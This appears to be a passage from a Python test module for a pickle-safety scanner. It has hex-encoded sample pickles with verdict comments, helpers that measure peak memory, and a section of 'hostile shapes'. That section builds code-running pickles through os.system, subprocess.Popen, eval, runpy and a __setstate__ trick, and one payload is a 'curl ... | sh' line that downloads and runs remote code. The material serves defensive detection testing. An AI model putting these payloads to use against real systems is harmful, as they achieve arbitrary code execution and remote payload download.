    "q16_objarray_like_member_p2": "80027d7100285801000000617101635f5f6d61696e5f5f0a5f7265636f6e7374727563740a7102635f5f6d61696e5f5f0a4f626a41727261790a71034b00857104635f636f646563730a656e636f64650a7105580100000062710658060000006c6174696e31710786710852710987710a52710b284b014b0285710c58020000004f38710d895d710e28635f5f6d61696e5f5f0a48616e646c65720a710f298171107d71115804000000706f727471124b017362680f298171137d711468124b0273626574711562580600000066616d696c79711663736f636b65740a41465f494e45540a7117752e",
    "q16_objarray_like_member_p4": "8004959d000000000000007d94288c0161948c085f5f6d61696e5f5f948c0c5f7265636f6e73747275637494939468028c084f626a41727261799493944b0085944301629487945294284b014b0285948c024f3894895d942868028c0748616e646c65729493942981947d948c04706f7274944b017362680f2981947d9468124b027362657494628c0666616d696c79948c06736f636b6574948c0741465f494e4554949394752e",
    "q23_pandas_frame_member": "80027d28580200000064666370616e6461732e636f72652e6672616d650a446174614672616d650a29817d2858040000005f6d67726370616e6461732e636f72652e696e7465726e616c732e6d616e61676572730a426c6f636b4d616e616765720a298128286370616e6461732e636f72652e696e64657865732e626173650a5f6e65775f496e6465780a286370616e6461732e636f72652e696e64657865732e626173650a496e6465780a7d28580400000064617461636e756d70792e636f72652e6d756c746961727261790a5f7265636f6e7374727563740a28636e756d70790a6e6461727261790a4b00854301627452284b01284b0174636e756d70790a64747970650a2858020000004f3889887452284b0358010000007c4e4e4e4affffffff4affffffff4b3f746289285801000000616c746258040000006e616d654e75745271106370616e6461732e636f72652e696e64657865732e626173650a5f6e65775f496e6465780a286370616e6461732e636f72652e696e64657865732e72616e67650a52616e6765496e6465780a7d2858040000006e616d654e580500000073746172744b00580400000073746f704b035804000000737465704b0175745271116c28636e756d70792e636f72652e6d756c746961727261790a5f7265636f6e7374727563740a28636e756d70790a6e6461727261790a4b00854301627452284b01284b014b0374636e756d70790a64747970650a285802000000663889887452284b0358010000003c4e4e4e4affffffff4affffffff4b007462894318000000000000000000000000000000000000000000000000746271126c2868106c7d285806000000302e31342e317d2858040000006178657328681068116c5806000000626c6f636b73287d28580600000076616c756573681258080000006d67725f6c6f6373636275696c74696e730a736c6963650a284b004b014b017452756c7575746258040000005f7479705809000000646174616672616d6558090000005f6d657461646174615d580500000061747472737d58060000005f666c6167737d285817000000616c6c6f77735f6475706c69636174655f6c6162656c7388757562580600000066616d696c7963736f636b65740a41465f494e45540a752e",
    "q23b_pandas_frame_deque": "80027d28580200000064666370616e6461732e636f72652e6672616d650a446174614672616d650a29817d2858040000005f6d67726370616e6461732e636f72652e696e7465726e616c732e6d616e61676572730a426c6f636b4d616e616765720a298128286370616e6461732e636f72652e696e64657865732e626173650a5f6e65775f496e6465780a286370616e6461732e636f72652e696e64657865732e626173650a496e6465780a7d28580400000064617461636e756d70792e636f72652e6d756c746961727261790a5f7265636f6e7374727563740a28636e756d70790a6e6461727261790a4b00854301627452284b01284b0174636e756d70790a64747970650a2858020000004f3889887452284b0358010000007c4e4e4e4affffffff4affffffff4b3f746289285801000000616c746258040000006e616d654e75745271106370616e6461732e636f72652e696e64657865732e626173650a5f6e65775f496e6465780a286370616e6461732e636f72652e696e64657865732e72616e67650a52616e6765496e6465780a7d2858040000006e616d654e580500000073746172744b00580400000073746f704b035804000000737465704b0175745271116c28636e756d70792e636f72652e6d756c746961727261790a5f7265636f6e7374727563740a28636e756d70790a6e6461727261790a4b00854301627452284b01284b014b0374636e756d70790a64747970650a285802000000663889887452284b0358010000003c4e4e4e4affffffff4affffffff4b007462894318000000000000000000000000000000000000000000000000746271126c2868106c7d285806000000302e31342e317d2858040000006178657328681068116c5806000000626c6f636b73287d28580600000076616c756573681258080000006d67725f6c6f6373636275696c74696e730a736c6963650a284b004b014b017452756c7575746258040000005f7479705809000000646174616672616d6558090000005f6d657461646174615d580500000061747472737d58060000005f666c6167737d285817000000616c6c6f77735f6475706c69636174655f6c6162656c738875756258010000007163636f6c6c656374696f6e730a64657175650a285d4b0a7452284b014b0265752e",
    "q24_numpy_objarray3_member_deque": "80027d28580100000061636e756d70792e636f72652e6d756c746961727261790a5f7265636f6e7374727563740a28636e756d70790a6e6461727261790a4b00854301627452284b01284b0374636e756d70790a64747970650a2858020000004f3889887452284b0358010000007c4e4e4e4affffffff4affffffff4b3f7462892863636f70797265670a5f7265636f6e7374727563746f720a28635f5f6d61696e5f5f0a48616e646c65720a636275696c74696e730a6f626a6563740a4e74527d285804000000706f72744b01756263636f70797265670a5f7265636f6e7374727563746f720a28635f5f6d61696e5f5f0a48616e646c65720a636275696c74696e730a6f626a6563740a4e74527d285804000000706f72744b02756263636f70797265670a5f7265636f6e7374727563746f720a28635f5f6d61696e5f5f0a48616e646c65720a636275696c74696e730a6f626a6563740a4e74527d285804000000706f72744b0375626c7462580600000066616d696c7963736f636b65740a41465f494e45540a58010000007163636f6c6c656374696f6e730a64657175650a285d4b0a7452284b014b0265752e",
}

# Re-check 4's residuals (round 5, A3 and A4): an object the pickle computed under a key it computes in a dict
# subclass's or an OrderedDict subclass's items (their items may be attributes: a class of no known kind), with a member
# kept, and a member under the literal name append or extend (an object's attribute, SimpleNamespace(extend=...), a
# plain dict's key), each with a deque: SC-PICKLE-CODE, as on base, though Python wrote them. (p10, a member under such
# a key, is quiet since round 6, A1': in PRECISION4_311.)
RESIDUAL4_311 = {
    "p11_dictsub_enumkey_obj_member_deque_p2": "80027d71002858010000006d7101635f5f6d61696e5f5f0a52656769737472790a710229817103635f5f6d61696e5f5f0a5472616e73706f72740a71044b01857105527106635f5f6d61696e5f5f0a48616e646c65720a7107298171087d71095804000000706f7274710a4b50736273580600000066616d696c79710b63736f636b65740a41465f494e45540a710c580100000071710d63636f6c6c656374696f6e730a64657175650a710e294b0a86710f52711028473ff000000000000047400000000000000065752e",
    "p11_dictsub_enumkey_obj_member_deque_p4": "800495ae000000000000007d94288c016d948c085f5f6d61696e5f5f948c08526567697374727994939429819468028c095472616e73706f72749493944b018594529468028c0748616e646c65729493942981947d948c04706f7274944b507362738c0666616d696c79948c06736f636b6574948c0741465f494e45549493948c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
    "p12_odsub_typekey_obj_member_deque_p2": "80027d7100285801000000637101635f5f6d61696e5f5f0a436f646563730a710229527103635f5f6275696c74696e5f5f0a6c6f6e670a7104635f5f6d61696e5f5f0a48616e646c65720a7105298171067d71075804000000706f727471084b01736273580400000073746f707109637369676e616c0a5349475445524d0a710a580100000071710b63636f6c6c656374696f6e730a64657175650a710c294b0a86710d52710e28473ff000000000000047400000000000000065752e",
    "p12_odsub_typekey_obj_member_deque_p4": "800495a7000000000000007d94288c0163948c085f5f6d61696e5f5f948c06436f646563739493942952948c086275696c74696e73948c03696e7494939468028c0748616e646c65729493942981947d948c04706f7274944b017362738c0473746f70948c067369676e616c948c075349475445524d9493948c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
    "p19_obj_attr_append_member_deque_p2": "80025d710028635f5f6d61696e5f5f0a456e64706f696e740a7101298171027d7103285804000000686f7374710458010000006871055806000000617070656e64710663736f636b65740a534f434b5f53545245414d0a7107756263636f6c6c656374696f6e730a64657175650a7108294b0a86710952710a28473ff000000000000047400000000000000065652e",
    "p19_obj_attr_append_member_deque_p4": "80049585000000000000005d94288c085f5f6d61696e5f5f948c08456e64706f696e749493942981947d94288c04686f7374948c0168948c06617070656e64948c06736f636b6574948c0b534f434b5f53545245414d94939475628c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065652e",
    "p20_namespace_extend_member_deque_p2": "80025d7100286374797065730a53696d706c654e616d6573706163650a7101295271027d7103285806000000657874656e647104637369676e616c0a5349475445524d0a710558040000006d6f646571065801000000777107756263636f6c6c656374696f6e730a64657175650a7108294b0a86710952710a28473ff000000000000047400000000000000065652e",
    "p20_namespace_extend_member_deque_p4": "80049585000000000000005d94288c057479706573948c0f53696d706c654e616d6573706163659493942952947d94288c06657874656e64948c067369676e616c948c075349475445524d9493948c046d6f6465948c01779475628c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065652e",
    "p21_dict_append_member_deque_p2": "80027d71002858030000006f707371017d7102285806000000617070656e64710363736f636b65740a534f434b5f53545245414d0a710458070000007265706c616365710563736f636b65740a534f434b5f444752414d0a710675580100000071710763636f6c6c656374696f6e730a64657175650a7108294b0a86710952710a28473ff000000000000047400000000000000065752e",
    "p21_dict_append_member_deque_p4": "80049583000000000000007d94288c036f7073947d94288c06617070656e64948c06736f636b6574948c0b534f434b5f53545245414d9493948c077265706c6163659468048c0a534f434b5f444752414d949394758c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
}

# Re-check 5's states of pairs (round 6, A1'): written by Python's own pickler in 3.10's form, never loaded: a
# __getstate__'s [(enum member, member)], list(d.items()) of {int: SIGTERM, str: SIGINT}, ((0, 10), (Handler,
# SIGTERM)), each before a deque. A member under a key the pickle computes is a known limit (PY311-MEMBER-PARITY):
# quiet, as on the second amendment.
PRECISION5_311 = {
    "a01_pairs_enumkey_member_deque_p1": "7d710028580100000073710163636f70795f7265670a5f7265636f6e7374727563746f720a710228635f5f6d61696e5f5f0a506169727353746174650a7103635f5f6275696c74696e5f5f0a6f626a6563740a71044e7471055271065d710728635f5f6d61696e5f5f0a5472616e73706f72740a7108284b0174710952710a63736f636b65740a534f434b5f53545245414d0a710b74710c6162580100000071710d63636f6c6c656374696f6e730a64657175650a710e28294b0a74710f52711028473ff000000000000047400000000000000065752e",
    "a01_pairs_enumkey_member_deque_p2": "80027d7100285801000000737101635f5f6d61696e5f5f0a506169727353746174650a7102298171035d7104635f5f6d61696e5f5f0a5472616e73706f72740a71054b0185710652710763736f636b65740a534f434b5f53545245414d0a71088671096162580100000071710a63636f6c6c656374696f6e730a64657175650a710b294b0a86710c52710d28473ff000000000000047400000000000000065752e",
    "a01_pairs_enumkey_member_deque_p4": "80049592000000000000007d94288c0173948c085f5f6d61696e5f5f948c0a506169727353746174659493942981945d9468028c095472616e73706f72749493944b01859452948c06736f636b6574948c0b534f434b5f53545245414d949394869461628c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
    "a02_items_classkey_member_deque_p1": "7d710028580100000074710163636f70795f7265670a5f7265636f6e7374727563746f720a710228635f5f6d61696e5f5f0a5461626c650a7103635f5f6275696c74696e5f5f0a6f626a6563740a71044e7471055271065d71072828635f5f6275696c74696e5f5f0a6c6f6e670a7108637369676e616c0a5349475445524d0a710974710a28635f5f6275696c74696e5f5f0a756e69636f64650a710b637369676e616c0a534947494e540a710c74710d6562580100000071710e63636f6c6c656374696f6e730a64657175650a710f28294b0a74711052711128473ff000000000000047400000000000000065752e",
    "a02_items_classkey_member_deque_p2": "80027d7100285801000000747101635f5f6d61696e5f5f0a5461626c650a7102298171035d710428635f5f6275696c74696e5f5f0a6c6f6e670a7105637369676e616c0a5349475445524d0a7106867107635f5f6275696c74696e5f5f0a756e69636f64650a7108637369676e616c0a534947494e540a710986710a6562580100000071710b63636f6c6c656374696f6e730a64657175650a710c294b0a86710d52710e28473ff000000000000047400000000000000065752e",
    "a02_items_classkey_member_deque_p4": "800495a0000000000000007d94288c0174948c085f5f6d61696e5f5f948c055461626c659493942981945d94288c086275696c74696e73948c03696e749493948c067369676e616c948c075349475445524d949394869468078c03737472949394680a8c06534947494e54949394869465628c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
    "a04_tuple_of_two_pairs_member_deque_p1": "7d710028580100000072710163636f70795f7265670a5f7265636f6e7374727563746f720a710228635f5f6d61696e5f5f0a52616e6765640a7103635f5f6275696c74696e5f5f0a6f626a6563740a71044e74710552710628284b004b0a74710728635f5f6d61696e5f5f0a48616e646c65720a7108637369676e616c0a5349475445524d0a710974710a74710b62580100000071710c63636f6c6c656374696f6e730a64657175650a710d28294b0a74710e52710f28473ff000000000000047400000000000000065752e",
    "a04_tuple_of_two_pairs_member_deque_p2": "80027d7100285801000000727101635f5f6d61696e5f5f0a52616e6765640a7102298171034b004b0a867104635f5f6d61696e5f5f0a48616e646c65720a7105637369676e616c0a5349475445524d0a710686710786710862580100000071710963636f6c6c656374696f6e730a64657175650a710a294b0a86710b52710c28473ff000000000000047400000000000000065752e",
    "a04_tuple_of_two_pairs_member_deque_p4": "80049587000000000000007d94288c0172948c085f5f6d61696e5f5f948c0652616e6765649493942981944b004b0a869468028c0748616e646c65729493948c067369676e616c948c075349475445524d94939486948694628c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
}

# ---- hostile shapes (inert) ---------------------------------------------------------------------------------------

def os_system(cmd="id", protocol=2):
    """A pickle that calls os.system(cmd): os.system's own name (posix.system on POSIX, nt.system on Windows)."""
    return pickle.dumps(Reduce(os.system, (cmd,)), protocol=protocol)


def stack_global_system(cmd="id"):
    """Protocol 4: os and system as strings memoized first, the STACK_GLOBAL reading them from the memo."""
    c = cmd.encode()
    return (b"\x80\x04\x8c\x02os\x94\x8c\x06system\x94\x8c\x05noise0" + b"h\x00h\x01\x93"
            + b"\x8c" + bytes([len(c)]) + c + b"\x85R.")


def build_setstate(callee_module="os", callee_name="system", cmd="id"):
    """An object whose __setstate__ becomes the callee, then a BUILD that calls it with `cmd`."""
    m, n, c = callee_module.encode(), callee_name.encode(), cmd.encode()
    return (b"\x80\x02cargparse\nNamespace\n)\x81}\x8c\x0c__setstate__c" + m + b"\n" + n + b"\nsb"
            + b"\x8c" + bytes([len(c)]) + c + b"b.")


def hostile():
    """Each code-running shape, by name."""
    return {
        "reduce.pkl": os_system("curl -s http://192.0.2.1/a | sh"),
        "stack_global.pkl": stack_global_system(),
        "inst.pkl": b"(S'id'\nios\nsystem\n.",
        "obj.pkl": b"\x80\x02(csubprocess\nPopen\n\x8c\x02sho.",
        "newobj.pkl": b"\x80\x02csubprocess\nPopen\n\x8c\x02sh\x85\x81.",
        "build.pkl": build_setstate(),
        "eval.pkl": b"\x80\x02c__builtin__\neval\n\x8c\x061+1 ;x\x85R.",
        "runpy.pkl": b"\x80\x04\x8c\x05runpy\x8c\t_run_code\x93\x8c\x02x=\x85R.",
    }


def peak_kib():
    """The process's peak resident memory in KiB: getrusage gives KiB on Linux and bytes on macOS (where the
    200 MB checkpoint tests read 156,270,592 as KiB, Oct 29). Windows has no getrusage: its peak working set
    (GetProcessMemoryInfo's PeakWorkingSetSize, in bytes), what it counts as resident."""
    if sys.platform == "win32":
        return _peak_working_set() // 1024
    import resource
    peak = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    return peak // 1024 if sys.platform == "darwin" else peak


def _peak_working_set():
    """Windows: this process's PeakWorkingSetSize (PROCESS_MEMORY_COUNTERS, psapi.h), in bytes."""
    import ctypes
    from ctypes import wintypes

    class Counters(ctypes.Structure):
        _fields_ = [("cb", wintypes.DWORD), ("PageFaultCount", wintypes.DWORD),
                    ("PeakWorkingSetSize", ctypes.c_size_t), ("WorkingSetSize", ctypes.c_size_t),
                    ("QuotaPeakPagedPoolUsage", ctypes.c_size_t), ("QuotaPagedPoolUsage", ctypes.c_size_t),
                    ("QuotaPeakNonPagedPoolUsage", ctypes.c_size_t), ("QuotaNonPagedPoolUsage", ctypes.c_size_t),
                    ("PagefileUsage", ctypes.c_size_t), ("PeakPagefileUsage", ctypes.c_size_t)]
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    psapi = ctypes.WinDLL("psapi", use_last_error=True)
    kernel32.GetCurrentProcess.argtypes = []
    kernel32.GetCurrentProcess.restype = wintypes.HANDLE
    psapi.GetProcessMemoryInfo.argtypes = [wintypes.HANDLE, ctypes.POINTER(Counters), wintypes.DWORD]
    psapi.GetProcessMemoryInfo.restype = wintypes.BOOL
    counters = Counters()
    counters.cb = ctypes.sizeof(Counters)
    if not psapi.GetProcessMemoryInfo(kernel32.GetCurrentProcess(), ctypes.byref(counters), counters.cb):
        raise ctypes.WinError(ctypes.get_last_error())
    return counters.PeakWorkingSetSize
